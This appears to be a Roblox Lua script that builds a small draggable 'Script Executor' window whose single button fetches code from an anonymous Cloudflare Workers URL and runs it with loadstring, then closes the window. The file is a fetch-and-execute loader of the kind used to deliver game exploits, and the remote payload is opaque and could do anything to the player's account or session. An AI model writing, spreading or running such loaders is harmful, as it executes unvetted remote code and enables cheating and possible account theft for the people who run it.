-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadstringGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create main frame
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 250, 0, 150)
mainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

-- TitleBar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleBar.Parent = mainFrame

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -10, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "Script Executor"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.Font = Enum.Font.GothamBold
titleText.TextSize = 14
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

-- Execute Button
local executeButton = Instance.new("TextButton")
executeButton.Size = UDim2.new(1, -40, 0, 45)
executeButton.Position = UDim2.new(0.5, 0, 0.65, 0)
executeButton.AnchorPoint = Vector2.new(0.5, 0.5)
executeButton.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
executeButton.Text = "Execute Script"
executeButton.Font = Enum.Font.GothamBold
executeButton.TextColor3 = Color3.new(1,1,1)
executeButton.TextSize = 16
executeButton.Parent = mainFrame

Instance.new("UICorner", executeButton).CornerRadius = UDim.new(0, 8)

-- Hover Effects (PC only)
executeButton.MouseEnter:Connect(function()
	executeButton.BackgroundColor3 = Color3.fromRGB(0, 95, 255)
end)

executeButton.MouseLeave:Connect(function()
	executeButton.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
end)

-- ✅ FIXED MOVABLE GUI (WORKS ON MOBILE + PC)
local UIS = game:GetService("UserInputService")
local dragging
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	mainFrame.Position =
		UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
end

titleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 
	or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPos = mainFrame.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

titleBar.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement
	or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		update(input)
	end
end)

-- Execute function
local function executeAndClose()
	executeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
	executeButton.Text = "Executing..."
	executeButton.Active = false

	local success, err = pcall(function()
		loadstring(game:HttpGet("https://aged-moomnn-3817.mjcontega2-cce.workers.dev"))()
	end)

	if not success then
		executeButton.Text = "Error!"
		wait(2)
	end

	for i = 3, 1, -1 do
		executeButton.Text = "Closing in " .. i
		wait(1)
	end

	screenGui:Destroy()
end

executeButton.MouseButton1Click:Connect(executeAndClose)

-- Shadow effect
local shadow = Instance.new("ImageLabel")
shadow.Size = UDim2.new(1, 10, 1, 10)
shadow.Position = UDim2.new(0, -5, 0, -5)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://5554236805"
shadow.ImageColor3 = Color3.new(0, 0, 0)
shadow.ImageTransparency = 0.8
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(23, 23, 277, 277)
shadow.Parent = mainFrame
shadow.ZIndex = -1
